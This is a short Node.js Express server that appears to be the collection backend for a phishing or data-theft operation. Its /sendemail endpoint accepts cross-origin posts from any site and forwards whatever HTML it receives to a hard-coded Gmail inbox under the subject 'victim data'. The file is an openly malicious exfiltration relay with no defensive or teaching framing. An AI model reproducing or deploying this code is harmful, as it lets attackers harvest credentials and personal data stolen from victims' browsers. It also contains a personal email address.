const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const cors = require('cors');


app.use(express.json());
app.use(cors());


app.post("/sendemail", (req, res) => {
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'cleo.master0000@gmail.com',
            pass: process.env.PASS
        }
    });

    let mailOptions = {
        from: 'cleo.master0000@gmail.com',
        to: 'cleo.master0000@gmail.com',
        subject: 'victim data',
        html: req.body.body,
    };


    transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
            return res.send("Done");
        }
    });


})



const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Listening on port ${port}...`));